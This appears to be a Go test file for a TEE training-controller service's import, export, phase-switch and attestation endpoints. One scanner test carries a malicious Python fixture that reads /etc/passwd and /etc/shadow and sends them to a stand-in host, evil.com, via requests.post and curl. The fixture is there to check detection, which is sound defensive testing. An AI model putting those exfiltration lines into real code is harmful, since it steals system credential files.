package controller

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	teecrypto "taa/crypto"
)

func setupTestState(t *testing.T) (*TAAState, string) {
	t.Helper()
	tmpDir := t.TempDir()
	attestationPath := filepath.Join(tmpDir, "attestation.report")
	mockReport := bytes.Repeat([]byte{0xAB}, 64)
	if err := os.WriteFile(attestationPath, mockReport, 0o600); err != nil {
		t.Fatalf("write mock attestation: %v", err)
	}

	// 创建 mock helper 脚本：生成 report.cert 和 nonce.bin
	helperPath := filepath.Join(tmpDir, "mock-helper.sh")
	helperScript := `#!/bin/sh
dd if=/dev/urandom of=report.cert bs=1 count=2548 2>/dev/null
# 如果 nonce.bin 已存在则保留（由 Go 预写入），否则生成随机 nonce
if [ ! -f nonce.bin ]; then
    dd if=/dev/urandom of=nonce.bin bs=1 count=16 2>/dev/null
fi
`
	if err := os.WriteFile(helperPath, []byte(helperScript), 0o755); err != nil {
		t.Fatalf("write mock helper: %v", err)
	}

	// 创建临时目录用于测试
	modelDir := filepath.Join(tmpDir, "models")
	dataDir := filepath.Join(tmpDir, "data")
	resultDir := filepath.Join(tmpDir, "results")
	if err := os.MkdirAll(modelDir, 0o755); err != nil {
		t.Fatalf("create model dir: %v", err)
	}
	if err := os.MkdirAll(resultDir, 0o755); err != nil {
		t.Fatalf("create result dir: %v", err)
	}

	if err := os.WriteFile(filepath.Join(resultDir, "result.txt"), []byte("mock training result"), 0o644); err != nil {
		t.Fatalf("write mock result: %v", err)
	}

	sm2Key, err := teecrypto.GenerateSM2KeyPair()
	if err != nil {
		t.Fatalf("generate SM2 key: %v", err)
	}

	userData := sm2UserDataFromPublicKey(&sm2Key.PublicKey)

	inputDir := filepath.Join(tmpDir, "input")
	outputDir := filepath.Join(tmpDir, "output")

	state := NewTAAState(attestationPath, "127.0.0.1:65535", "test-docker-001", helperPath, "auto", sm2Key, userData, SecurityConfig{
		ScanEnabled:    false,
		ModelDir:       modelDir,
		DataDir:        dataDir,
		ResultCheck:    false,
		ResultDir:      resultDir,
		ModelInputDir:  inputDir,
		ModelOutputDir: outputDir,
	})
	return state, attestationPath
}

func sm2UserDataFromPublicKey(pub *teecrypto.SM2PublicKey) []byte {
	userData := make([]byte, 64)
	if pub == nil || pub.X == nil || pub.Y == nil {
		return userData
	}

	xBytes := pub.X.Bytes()
	yBytes := pub.Y.Bytes()
	copy(userData[32-len(xBytes):32], xBytes)
	copy(userData[64-len(yBytes):], yBytes)
	return userData
}

func setupTestServer(t *testing.T) (*TAAState, *httptest.Server) {
	t.Helper()
	state, _ := setupTestState(t)
	mux := http.NewServeMux()
	RegisterRoutes(mux, state)
	server := httptest.NewServer(mux)
	t.Cleanup(server.Close)
	return state, server
}

func makeRuntimeConfigJSON(t *testing.T, commands []string, env map[string]string) string {
	t.Helper()
	payload := struct {
		Commands []string `json:"commands"`
		Env      string   `json:"env,omitempty"`
	}{Commands: commands}
	if env != nil {
		data, err := json.Marshal(env)
		if err != nil {
			t.Fatalf("marshal runtime env: %v", err)
		}
		payload.Env = string(data)
	}
	data, err := json.Marshal(payload)
	if err != nil {
		t.Fatalf("marshal runtime config: %v", err)
	}
	return string(data)
}

func makePhase1TrainingRuntimeConfigJSON(t *testing.T, marker string) string {
	t.Helper()
	return makeRuntimeConfigJSON(t, []string{
		`mkdir -p "$TAA_OUTPUT_DIR"`,
		fmt.Sprintf(`printf '%%s\n' %q > "$TAA_OUTPUT_DIR/marker.txt"`, marker),
		`cat > "$TAA_OUTPUT_DIR/training_result.json" <<'JSON'
{"dataset":{"total_samples":1,"splits":{"train":1,"test":0}},"metrics":{"loss":0.0,"accuracy":1.0}}
JSON`,
	}, map[string]string{"PYTHONUNBUFFERED": "1"})
}

func postJSON(t *testing.T, url string, body any) *http.Response {
	t.Helper()
	data, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal body: %v", err)
	}
	resp, err := http.Post(url, "application/json", bytes.NewReader(data))
	if err != nil {
		t.Fatalf("POST %s: %v", url, err)
	}
	return resp
}

func decodeResponse(t *testing.T, resp *http.Response) apiResponse {
	t.Helper()
	defer resp.Body.Close()
	var api apiResponse
	if err := json.NewDecoder(resp.Body).Decode(&api); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	return api
}

// sealForTAA 用 TAA 的 SM2 公钥对明文做信封加密，返回拼接后的资源数据：
// WrappedKey(129B) || Ciphertext(可变长)
func sealForTAA(t *testing.T, priv *teecrypto.SM2PrivateKey, plaintext []byte) []byte {
	t.Helper()
	sealed, err := teecrypto.SealSM2SM4GCM(&priv.PublicKey, plaintext)
	if err != nil {
		t.Fatalf("SealSM2SM4GCM: %v", err)
	}
	return sealed
}

func openSealedForTAA(t *testing.T, priv *teecrypto.SM2PrivateKey, sealed []byte) []byte {
	t.Helper()
	decrypted, err := teecrypto.OpenSM2SM4GCM(priv, sealed)
	if err != nil {
		t.Fatalf("OpenSM2SM4GCM: %v", err)
	}
	return decrypted
}

func seedExportIndexRecord(t *testing.T, state *TAAState, requestID, taskID, resultSubdir string) ImportIndexRecord {
	t.Helper()
	store, err := state.importIndexStore()
	if err != nil {
		t.Fatalf("load import index store: %v", err)
	}
	record := ImportIndexRecord{
		RequestID: requestID,
		TaskID:    taskID,
		Hash:      "test-hash-" + requestID + "-" + taskID,
		DataDir:   filepath.Join(state.Security.DataDir, "seeded-"+requestID+"-"+taskID),
		ResultDir: filepath.Join(state.Security.ResultDir, resultSubdir),
	}
	if err := os.MkdirAll(record.DataDir, 0o755); err != nil {
		t.Fatalf("create seeded data dir: %v", err)
	}
	if err := os.MkdirAll(record.ResultDir, 0o755); err != nil {
		t.Fatalf("create seeded result dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(record.ResultDir, "training_report.json"), []byte(`{"status":"ok"}`), 0o644); err != nil {
		t.Fatalf("write seeded training report: %v", err)
	}
	if err := store.Reserve(requestID, taskID); err != nil {
		t.Fatalf("reserve import index record: %v", err)
	}
	if err := store.Commit(record); err != nil {
		t.Fatalf("commit import index record: %v", err)
	}
	return record
}

// ── Test: /v1/taa/switch ─────────────────────────────────

func TestSwitchHandler(t *testing.T) {
	state, server := setupTestServer(t)

	t.Run("valid switch 1→2", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 2})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if state.CurrentPhase != 2 {
			t.Fatalf("phase = %d, want 2", state.CurrentPhase)
		}
	})

	t.Run("switch 2→4 allowed", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 4})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if state.CurrentPhase != 4 {
			t.Fatalf("phase = %d, want 4", state.CurrentPhase)
		}
	})

	t.Run("valid switch 2→1", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 1})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if state.CurrentPhase != 1 {
			t.Fatalf("phase = %d, want 1", state.CurrentPhase)
		}
	})

	t.Run("invalid phase value", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 99})
		api := decodeResponse(t, resp)
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected failure for phase=99")
		}
	})

	t.Run("method not allowed", func(t *testing.T) {
		resp, err := http.Get(server.URL + "/v1/taa/switch")
		if err != nil {
			t.Fatalf("GET: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusMethodNotAllowed {
			t.Fatalf("status = %d, want 405", resp.StatusCode)
		}
	})
}

// ── Test: /v1/taa/import ─────────────────────────────────

func TestImportHandler(t *testing.T) {
	state, server := setupTestServer(t)

	t.Run("phase1 requires both model and data then runs runtimeConfig", func(t *testing.T) {
		reportCh := make(chan importedReportPayload, 1)
		platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			switch r.URL.Path {
			case reportResEndpoint:
				var payload importedReportPayload
				if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
					t.Errorf("decode reportRes payload: %v", err)
					w.WriteHeader(http.StatusBadRequest)
					return
				}
				reportCh <- payload
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer platformServer.Close()

		state.mu.Lock()
		state.PlatformIP = platformServer.URL
		state.DockerID = "docker-phase1"
		sm2Key := state.SM2PrivateKey
		state.mu.Unlock()

		modelArchiveData := buildTarGzArchive(t, map[string]archiveEntry{
			"train.py": {mode: 0o755, data: []byte("#!/usr/bin/env python3\nfrom argparse import ArgumentParser\nfrom pathlib import Path\nimport json\nparser = ArgumentParser(add_help=False)\nparser.add_argument(\"--data-dir\", dest=\"data_dir\", required=True)\nparser.add_argument(\"--output\", \"-o\", dest=\"output_dir\", required=True)\nargs, _ = parser.parse_known_args()\noutput_dir = Path(args.output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\nresult = {\"dataset\": {\"total_samples\": 1, \"splits\": {\"train\": 1, \"test\": 0}}, \"metrics\": {\"loss\": 0.0, \"accuracy\": 1.0}}\n(output_dir / \"marker.txt\").write_text(\"ok\\n\")\n(output_dir / \"training_result.json\").write_text(json.dumps(result, indent=2, ensure_ascii=False) + \"\\n\")\n")},
		})
		modelResourceData := sealForTAA(t, sm2Key, modelArchiveData)

		dataArchiveData := buildTarGzArchive(t, map[string]archiveEntry{
			"sample.txt": {mode: 0o644, data: []byte("training data\n")},
		})
		dataResourceData := sealForTAA(t, sm2Key, dataArchiveData)

		resourceServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.Contains(r.URL.Path, "model") {
				_, _ = w.Write(modelResourceData)
			} else {
				_, _ = w.Write(dataResourceData)
			}
		}))
		defer resourceServer.Close()

		// 获取公钥 PEM 用于 import 请求
		sdkPub := &sm2Key.PublicKey
		pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
		if err != nil {
			t.Fatalf("marshal SM2 public key PEM: %v", err)
		}

		started := time.Now()
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": resourceServer.URL + "/model.tar.gz.enc",
			"requestId":   "req-import-phase1",
			"taskId":      "task-phase1",
			"publicKey":   string(pubPEM),
		})
		elapsed := time.Since(started)
		api := decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if elapsed > time.Second {
			t.Fatalf("handler returned after %s, want immediate response before background work", elapsed)
		}
		if api.Result != nil {
			t.Fatalf("import result = %#v, want nil", api.Result)
		}

		resp = postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": resourceServer.URL + "/data.tar.gz.enc",
			"requestId":   "req-import-phase1-data",
			"taskId":      "task-phase1",
		})
		api = decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("import data: expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}

		var reportPayload importedReportPayload
		select {
		case reportPayload = <-reportCh:
		case <-time.After(15 * time.Second):
			t.Fatal("timed out waiting for training result report")
		}
		if reportPayload.DockerID != "docker-phase1" || reportPayload.TaskID != "task-phase1" {
			t.Fatalf("reportRes payload = %+v", reportPayload)
		}
		if reportPayload.Report == "" {
			t.Fatal("reportRes payload missing report")
		}
		var report map[string]any
		if err := json.Unmarshal([]byte(reportPayload.Report), &report); err != nil {
			t.Fatalf("reportRes report is not valid JSON: %v", err)
		}
		if report["schema_version"] != "1.0" {
			t.Fatalf("report schema_version = %v, want 1.0", report["schema_version"])
		}
		if _, ok := report["codeaudit"]; ok {
			t.Fatalf("phase1 report should not include codeaudit: %v", report)
		}
		state.mu.RLock()
		modelImported := state.ModelImported
		savedKey := state.ExportPublicKey
		state.mu.RUnlock()
		if !modelImported {
			t.Fatalf("state modelImported = %v, want true", modelImported)
		}
		if savedKey != string(pubPEM) {
			t.Fatalf("ExportPublicKey = %q, want %q", savedKey, string(pubPEM))
		}
	})

	t.Run("phase1 runtimeConfig empty fails training", func(t *testing.T) {
		state, server := setupTestServer(t)
		state.mu.Lock()
		state.CurrentPhase = 1
		state.mu.Unlock()

		reportCh := make(chan importedReportPayload, 1)
		platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != reportResEndpoint {
				t.Fatalf("unexpected report endpoint: %s", r.URL.Path)
			}
			var payload importedReportPayload
			if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
				t.Fatalf("decode reportRes payload: %v", err)
			}
			reportCh <- payload
			w.WriteHeader(http.StatusOK)
		}))
		defer platformServer.Close()

		state.mu.Lock()
		state.PlatformIP = platformServer.URL
		state.mu.Unlock()

		resourceServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.Contains(r.URL.Path, "model") {
				_, _ = w.Write(buildTarGzArchive(t, map[string]archiveEntry{"placeholder.txt": {mode: 0o644, data: []byte("model\n")}}))
				return
			}
			_, _ = w.Write(buildTarGzArchive(t, map[string]archiveEntry{"sample.txt": {mode: 0o644, data: []byte("training data\n")}}))
		}))
		defer resourceServer.Close()

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": resourceServer.URL + "/model.tar.gz",
			"requestId":   "req-import-empty-runtime-config",
			"taskId":      "task-empty-runtime-config",
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("import model: expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}

		resp = postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": resourceServer.URL + "/data.tar.gz",
			"requestId":   "req-import-empty-runtime-config-data",
			"taskId":      "task-empty-runtime-config",
		})
		api = decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("import data: expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}

		select {
		case payload := <-reportCh:
			if payload.Code != 1 {
				t.Fatalf("reportRes code = %d, want 1", payload.Code)
			}
			if payload.Msg == nil || !strings.Contains(*payload.Msg, "runtimeConfig 不能为空") {
				t.Fatalf("reportRes msg = %v, want runtimeConfig failure", payload.Msg)
			}
		case <-time.After(10 * time.Second):
			t.Fatal("timed out waiting for empty runtimeConfig failure report")
		}
	})

	t.Run("phase1 runtimeConfig empty fails training", func(t *testing.T) {
		state, server := setupTestServer(t)
		state.mu.Lock()
		state.CurrentPhase = 1
		state.mu.Unlock()

		reportCh := make(chan importedReportPayload, 1)
		platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != reportResEndpoint {
				t.Fatalf("unexpected report endpoint: %s", r.URL.Path)
			}
			var payload importedReportPayload
			if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
				t.Fatalf("decode reportRes payload: %v", err)
			}
			reportCh <- payload
			w.WriteHeader(http.StatusOK)
		}))
		defer platformServer.Close()

		state.mu.Lock()
		state.PlatformIP = platformServer.URL
		state.mu.Unlock()

		resourceServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.Contains(r.URL.Path, "model") {
				_, _ = w.Write(buildTarGzArchive(t, map[string]archiveEntry{"placeholder.txt": {mode: 0o644, data: []byte("model\n")}}))
				return
			}
			_, _ = w.Write(buildTarGzArchive(t, map[string]archiveEntry{"sample.txt": {mode: 0o644, data: []byte("training data\n")}}))
		}))
		defer resourceServer.Close()

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": resourceServer.URL + "/model.tar.gz",
			"requestId":   "req-import-empty-runtime-config",
			"taskId":      "task-empty-runtime-config",
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("import model: expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}

		resp = postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": resourceServer.URL + "/data.tar.gz",
			"requestId":   "req-import-empty-runtime-config-data",
			"taskId":      "task-empty-runtime-config",
		})
		api = decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("import data: expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}

		select {
		case payload := <-reportCh:
			if payload.Code != 1 {
				t.Fatalf("reportRes code = %d, want 1", payload.Code)
			}
			if payload.Msg == nil || !strings.Contains(*payload.Msg, "runtimeConfig 不能为空") {
				t.Fatalf("reportRes msg = %v, want runtimeConfig failure", payload.Msg)
			}
		case <-time.After(10 * time.Second):
			t.Fatal("timed out waiting for empty runtimeConfig failure report")
		}
	})

	t.Run("phase1 import with invalid publicKey returns error", func(t *testing.T) {
		state, server := setupTestServer(t)
		state.mu.Lock()
		state.CurrentPhase = 1
		state.mu.Unlock()

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/model.tar.gz",
			"requestId":   "req-import-invalid-key",
			"taskId":      "task-invalid-key",
			"publicKey":   "not-a-valid-pem",
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode == http.StatusOK && api.Error == 0 {
			t.Fatalf("expected error for invalid publicKey, got 200/0")
		}
		if !strings.Contains(api.Msg, "publicKey 解析失败") {
			t.Fatalf("unexpected msg: %s", api.Msg)
		}
	})

	t.Run("phase1 import failure does not overwrite saved key", func(t *testing.T) {
		state, server := setupTestServer(t)
		state.mu.Lock()
		state.CurrentPhase = 1
		state.ExportPublicKey = "previous-key"
		state.mu.Unlock()

		resourceServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusNotFound)
		}))
		defer resourceServer.Close()

		sdkPub := &state.SM2PrivateKey.PublicKey
		pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
		if err != nil {
			t.Fatalf("marshal SM2 public key PEM: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": resourceServer.URL + "/missing.tar.gz",
			"requestId":   "req-import-failed-key",
			"taskId":      "task-failed-key",
			"publicKey":   string(pubPEM),
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode == http.StatusOK && api.Error == 0 {
			t.Fatalf("expected error for failed import, got 200/0")
		}

		state.mu.RLock()
		savedKey := state.ExportPublicKey
		state.mu.RUnlock()
		if savedKey != "previous-key" {
			t.Fatalf("ExportPublicKey = %q, want previous-key", savedKey)
		}
	})

	t.Run("import model (download expected to fail with fake URL)", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/model.tar.gz",
			"requestId":   "req-import-001",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败，应该返回错误
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("import data (download expected to fail with fake URL)", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": "http://example.com/data.tar.gz",
			"requestId":   "req-import-002",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败，应该返回错误
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("missing resourceUrl", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"requestId": "req-import-003",
		})
		api := decodeResponse(t, resp)
		if api.Error == 0 {
			t.Fatal("expected error for missing resourceUrl")
		}
	})
}

// ── Test: /v1/taa/import with security scan ──────────────

func TestImportSecurityScan(t *testing.T) {
	// Helper: create a temp dir with model code and return a state with scan enabled.
	setupScanState := func(t *testing.T, code string) (*TAAState, *httptest.Server) {
		t.Helper()
		state, _ := setupTestState(t)
		modelDir := t.TempDir()
		if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
			t.Fatal(err)
		}
		state.Security.ScanEnabled = true
		state.Security.ModelDir = modelDir

		mux := http.NewServeMux()
		RegisterRoutes(mux, state)
		server := httptest.NewServer(mux)
		t.Cleanup(server.Close)
		return state, server
	}

	t.Run("reject malicious code (download will fail with fake URL)", func(t *testing.T) {
		_, server := setupScanState(t, `
import requests
import subprocess
def steal():
    data = open("/etc/passwd").read()
    requests.post("http://evil.com/steal", data=data)
    subprocess.run(["curl", "http://evil.com", "-d", "@/etc/shadow"])
`)
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/malicious.tar.gz",
			"requestId":   "req-scan-001",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败，不会到达安全扫描阶段
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("accept benign code (download will fail with fake URL)", func(t *testing.T) {
		_, server := setupScanState(t, `
import torch
import torch.nn as nn
model = nn.Linear(10, 2)
optimizer = torch.optim.Adam(model.parameters(), lr=0.001)
`)
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/benign.tar.gz",
			"requestId":   "req-scan-002",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("scan disabled (download will fail with fake URL)", func(t *testing.T) {
		state, _ := setupTestState(t)
		state.Security.ScanEnabled = false // scan off

		mux := http.NewServeMux()
		RegisterRoutes(mux, state)
		server := httptest.NewServer(mux)
		t.Cleanup(server.Close)

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/anything.tar.gz",
			"requestId":   "req-scan-003",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("data import not scanned (download will fail with fake URL)", func(t *testing.T) {
		_, server := setupScanState(t, `import requests  # this is model code`)
		// data import should not trigger security scan
		resp := postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": "http://example.com/data.tar.gz",
			"requestId":   "req-scan-004",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})
}

// ── Test: /v1/taa/export ─────────────────────────────────

func TestExportHandler(t *testing.T) {
	state, server := setupTestServer(t)
	sm2Key := state.SM2PrivateKey

	// 准备公钥 PEM
	sdkPub := &sm2Key.PublicKey
	pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
	if err != nil {
		t.Fatalf("marshal SM2 public key PEM: %v", err)
	}

	exportPlaintext := []byte("export test result data")

	t.Run("indexed lookup returns plaintext tar.gz", func(t *testing.T) {
		record := seedExportIndexRecord(t, state, "req-export-plain", "task-001", "export-plain")
		if err := os.WriteFile(filepath.Join(record.ResultDir, "phase1.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write seeded phase1.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"requestId": "req-export-plain",
			"taskId":    "task-001",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Task-Id"); got != "task-001" {
			t.Fatalf("X-TAA-Task-Id = %q, want task-001", got)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got == "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want not true (plaintext)", got)
		}
		if got := resp.Header.Get("Content-Disposition"); !strings.Contains(got, filepath.Base(record.ResultDir)+".tar.gz") {
			t.Fatalf("Content-Disposition = %q, want filename based on result dir", got)
		}
		raw, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		files := extractTarGzMap(t, raw)
		if got, ok := files["export-plain/phase1.bin"]; !ok {
			t.Fatalf("plaintext tar.gz missing export-plain/phase1.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("plaintext export-plain/phase1.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("indexed lookup returns encrypted tar.gz", func(t *testing.T) {
		record := seedExportIndexRecord(t, state, "req-export-encrypted", "task-002", "export-encrypted")
		if err := os.WriteFile(filepath.Join(record.ResultDir, "train.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write seeded train.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"requestId": "req-export-encrypted",
			"publicKey": string(pubPEM),
			"taskId":    "task-002",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Task-Id"); got != "task-002" {
			t.Fatalf("X-TAA-Task-Id = %q, want task-002", got)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want true", got)
		}
		sealed, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		decrypted := openSealedForTAA(t, sm2Key, sealed)
		files := extractTarGzMap(t, decrypted)
		if got, ok := files["export-encrypted/train.bin"]; !ok {
			t.Fatalf("decrypted tar.gz missing export-encrypted/train.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("decrypted export-encrypted/train.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("rejects missing requestId and taskId", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"publicKey": "mock-public-key",
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode != http.StatusBadRequest || api.Error == 0 {
			t.Fatalf("expected requestId/taskId validation error, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if !strings.Contains(api.Msg, "requestId 和 taskId 不能同时为空") {
			t.Fatalf("msg = %q, want requestId/taskId validation", api.Msg)
		}
	})

	t.Run("allows missing taskId and looks up by requestId", func(t *testing.T) {
		record := seedExportIndexRecord(t, state, "req-export-no-task", "task-003", "export-no-task")
		if err := os.WriteFile(filepath.Join(record.ResultDir, "request.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write seeded request.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"requestId": "req-export-no-task",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200 without taskId, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Task-Id"); got != "" {
			t.Fatalf("X-TAA-Task-Id = %q, want empty when taskId omitted", got)
		}
		if got := resp.Header.Get("Content-Disposition"); !strings.Contains(got, filepath.Base(record.ResultDir)+".tar.gz") {
			t.Fatalf("Content-Disposition = %q, want result-dir filename", got)
		}
		raw, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		files := extractTarGzMap(t, raw)
		if got, ok := files["export-no-task/request.bin"]; !ok {
			t.Fatalf("plaintext tar.gz missing export-no-task/request.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("plaintext export-no-task/request.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("rejects mismatched requestId and taskId", func(t *testing.T) {
		seedExportIndexRecord(t, state, "req-export-mismatch-req", "task-mismatch-a", "export-mismatch-a")
		seedExportIndexRecord(t, state, "req-export-mismatch-task", "task-mismatch-b", "export-mismatch-b")

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"requestId": "req-export-mismatch-req",
			"taskId":    "task-mismatch-b",
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode != http.StatusBadRequest || api.Error == 0 {
			t.Fatalf("expected mismatch validation error, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if !strings.Contains(api.Msg, "命中了不同记录") {
			t.Fatalf("unexpected msg: %s", api.Msg)
		}
	})
}

// ── Test: /v1/taa/getAttestation ─────────────────────────

func TestGetAttestationHandler(t *testing.T) {
	state, server := setupTestServer(t)

	t.Run("success returns json", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/getAttestation", map[string]any{
			"requestId": "req-att-001",
		})
		if resp.StatusCode != 200 {
			resp.Body.Close()
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}
		ct := resp.Header.Get("Content-Type")
		if !strings.Contains(ct, "application/json") {
			resp.Body.Close()
			t.Fatalf("Content-Type = %q, want application/json", ct)
		}
		api := decodeResponse(t, resp)
